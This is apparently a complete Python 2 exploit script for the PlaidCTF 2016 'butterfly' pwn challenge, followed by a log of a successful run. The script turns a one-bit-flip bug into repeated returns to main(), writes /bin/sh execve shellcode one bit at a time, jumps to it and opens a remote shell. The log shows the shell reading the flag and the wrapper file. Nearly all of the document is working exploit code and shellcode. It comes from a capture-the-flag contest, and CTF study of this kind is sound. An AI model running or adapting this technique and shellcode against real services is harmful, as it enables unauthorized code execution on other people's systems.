#!/usr/bin/env python2
# --------------------------------------------------------------------------------------------------
# PlaidCTF 2016 - butterfly (Pwn 150)
# --------------------------------------------------------------------------------------------------
import struct
import sys
import socket
import struct
import telnetlib


# --------------------------------------------------------------------------------------------------
def recv_until(st):                         	# receive until you encounter a string
  ret = ""
  while st not in ret:
	ret += s.recv(16384)

  return ret

# --------------------------------------------------------------------------------------------------
if __name__ == "__main__":


	s = socket.create_connection(('butterfly.pwning.xxx', 9999))  # connect to server
	# s = socket.create_connection(('localhost', 7777))

	recv_until("THOU ART GOD, WHITHER CASTEST THY COSMIC RAY?")

	'''
		First break stack alignment to control rip.
		Change this: .text:0000000000400860 48 83 C4 48      add     rsp, 48h
		To this:     .text:0000000000400860 48 83 C4 08      add     rsp, 8

		Then you can control return address: .text:0000000000400788    public main
	'''
	p = (0x0000000000400863 << 3) | 6
	q = '0x%08x' % p + " " + "A"*29 + struct.pack('<Q', 0x0000000000400788) + "\n"

	s.send( q )


	# Now you can return as many times as you want to main() writing each time 1 bit
	# Let's write shellcode here: .text:0000000000400890    __libc_csu_init proc near
	trg_addr = 0x0000000000400890

	init_data = [ 0x41, 0x57, 0x41, 0x56, 0x41, 0x89, 0xFF, 0x41, 0x55, 0x41, 0x54, 0x4C, 
				  0x8D, 0x25, 0x16, 0x02, 0x20, 0x00, 0x55, 0x48, 0x8D, 0x2D, 0x16, 0x02, 
				  0x20, 0x00, 0x53, 0x49, 0x89, 0xF6, 0x49, 0x89 ]

	shellcode =	[ 0x31, 0xF6, 0x48, 0xBB, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x2F, 0x73, 0x68,
				  0x56, 0x53, 0x54, 0x5F, 0x6A, 0x3b, 0x58, 0x31, 0xD2, 0x0F, 0x05 ]

	payload   = [ "{0:08b}".format(shellcode[i] ^ init_data[i]) for i in range( len(shellcode) ) ]


	# send the payload bit by bit
	for i in range(0, len(payload)):
		print "Writing Shellcode byte #%d: %s (%02x)" % (i+1, payload[i], shellcode[i])

		c = 7
		for j in payload[i]:
			if j ==  '1': 					# flip only bits that are 1

				recv_until("THOU ART GOD, WHITHER CASTEST THY COSMIC RAY?")
	
				p = ((trg_addr + i) << 3) | c
				q = '0x%08x' % p + " " + "A"*29 + struct.pack('<Q', 0x0000000000400788) + "\n"

				s.send( q )

			c -= 1


	# 1 more time to return to the shellcode
	recv_until("THOU ART GOD, WHITHER CASTEST THY COSMIC RAY?")

	print "Returning to shellcode..."
	
	p = (0x0000000000600000 << 3) | 0
	q = '0x%08x' % p + " " + "A"*29 + struct.pack('<Q', trg_addr) + "\n"

	s.send( q )
	recv_until("WAS IT WORTH IT???")


	print "*** Opening Shell ***"
	t = telnetlib.Telnet()                 	# try to open shell
	t.sock = s
	t.interact()

	exit(0)

# --------------------------------------------------------------------------------------------------
'''
root@nogirl:~/ctf/plaidctf# ./butterfly_expl.py 
	Writing Shellcode byte #1: 01110000 (31)
	Writing Shellcode byte #2: 10100001 (f6)
	Writing Shellcode byte #3: 00001001 (48)
	Writing Shellcode byte #4: 11101101 (bb)
	Writing Shellcode byte #5: 01101110 (2f)
	Writing Shellcode byte #6: 11101011 (62)
	Writing Shellcode byte #7: 10010110 (69)
	Writing Shellcode byte #8: 00101111 (6e)
	Writing Shellcode byte #9: 01111010 (2f)
	Writing Shellcode byte #10: 01101110 (2f)
	Writing Shellcode byte #11: 00100111 (73)
	Writing Shellcode byte #12: 00100100 (68)
	Writing Shellcode byte #13: 11011011 (56)
	Writing Shellcode byte #14: 01110110 (53)
	Writing Shellcode byte #15: 01000010 (54)
	Writing Shellcode byte #16: 01011101 (5f)
	Writing Shellcode byte #17: 01001010 (6a)
	Writing Shellcode byte #18: 00111011 (3b)
	Writing Shellcode byte #19: 00001101 (58)
	Writing Shellcode byte #20: 01111001 (31)
	Writing Shellcode byte #21: 01011111 (d2)
	Writing Shellcode byte #22: 00100010 (0f)
	Writing Shellcode byte #23: 00010011 (05)
	Returning to shellcode...
	*** Opening Shell ***
		id
			uid=1001(problem) gid=1001(problem) groups=1001(problem)
		ls -la
			total 28
			drwxr-x--- 2 root problem 4096 Apr 15 21:49 .
			drwxr-xr-x 4 root root    4096 Apr 15 17:50 ..
			-rwxr-xr-x 1 root root    8328 Apr 15 18:26 butterfly
			-r--r----- 1 root problem   28 Apr 15 18:28 flag
			-rwxr-xr-x 1 root root     219 Apr 15 21:49 wrapper
		cat flag
			PCTF{b1t_fl1ps_4r3_0P_r1t3}
		cat wrapper
			#!/bin/bash
			DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
			cd $DIR
			ulimit -S -c 0 -t 20 -f 1000000 -v 1000000
			ulimit -H -c 0 -t 20 -f 1000000 -v 1000000
			exec nice -n 15 timeout -s 9 300 /home/problem/butterfly
		exit
	*** Connection closed by remote host ***
'''
# --------------------------------------------------------------------------------------------------
